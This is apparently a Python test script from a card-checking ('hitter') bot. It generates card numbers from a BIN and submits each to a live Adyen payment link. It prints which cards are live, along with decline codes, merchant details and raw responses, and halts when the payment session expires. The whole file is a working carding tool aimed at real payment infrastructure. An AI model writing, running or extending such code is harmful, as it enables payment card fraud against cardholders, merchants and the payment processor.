import sys
import os
import asyncio
import json

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from adyen_hitter import AdyenHitter
from bot import parse_ccn_input

async def run_live_test():
    url = "https://eu.adyen.link/PL77424D2AEB2188B0BD0E2A4"
    bin_str = "53265552551|03|29"
    
    print(f"=== Testing Live Link: {url} with BIN: {bin_str} ===")
    cards, err = parse_ccn_input([bin_str], bin_str)
    if err:
        print(f"Parser Error: {err}")
        return
        
    print(f"Generated {len(cards)} cards for CCN testing.")
    
    engine = AdyenHitter(url)
    
    # Run all cards in the parsed batch to verify continuous session generation
    from bot import is_session_expired_err
    for i, card in enumerate(cards, 1):
        print(f"\n--- Card Attempt {i}: {card['card']}|{card['month']}|{card['year']}|{card.get('cvv')} ---")
        res = await engine.hit_ccn(card, i, 0)
        print(f"Response Time: {res.get('response_time')}s")
        print(f"Success: {res.get('success')}")
        print(f"Is Live: {res.get('is_live')}")
        print(f"Decline Code: {res.get('decline_code')}")
        print(f"Error / Summary: {res.get('error')}")
        print(f"Merchant: {res.get('merchant')}")
        print(f"Amount: {res.get('amount')}")
        print(f"Raw Response: {json.dumps(res.get('raw_response'))}")
        
        if is_session_expired_err(res):
            print("\n[!] Session Expired/Consumed: Halting batch execution run early.")
            break

if __name__ == '__main__':
    asyncio.run(run_live_test())
